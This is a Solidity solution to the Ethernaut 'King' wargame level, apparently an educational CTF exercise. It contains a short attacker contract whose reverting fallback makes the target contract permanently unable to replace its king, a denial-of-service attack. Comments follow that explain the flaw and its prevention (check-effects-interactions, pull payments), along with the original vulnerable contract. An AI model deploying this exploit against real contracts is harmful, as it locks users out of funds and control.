// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface King {}

contract KingMe {
    constructor(address _king) public payable {
        address(_king).call.value(msg.value)("");
    }

    fallback() external payable {
        revert("not today");
    }
}

/*

Below is the original ethernaut contract.

A contracts response to receiving ether can disturb the flow of completion of the function being 
used to tranfer the funds and in result can lead to a Denial of Service Attack.

Security issues with contract: 

  - the contract does not consider the user contracts response to receiving funds.
  - check, effect, interaction pattern should be used in such scenarios. The requirement
    should be CHECKED, the EFFECT the transaction has should be stated and then after this
    the INTERACTION should be fulfilled in this case transferring the funds.

Prevention:

  - PUSH VS PULL design, it is safer to require users to pull funds from a contract
    instead of pushing funds to them.

*/

// ORIGINAL ETHERNAUT CONTRACT

// SPDX-License-Identifier: MIT
// pragma solidity ^0.6.0;

// contract King {
//     address payable king;
//     uint256 public prize;
//     address payable public owner;

//     constructor() public payable {
//         owner = msg.sender;
//         king = msg.sender;
//         prize = msg.value;
//     }

//     receive() external payable {
//         require(msg.value >= prize || msg.sender == owner);
//         king.transfer(msg.value);
//         king = msg.sender;
//         prize = msg.value;
//     }

//     function _king() public view returns (address payable) {
//         return king;
//     }
// }
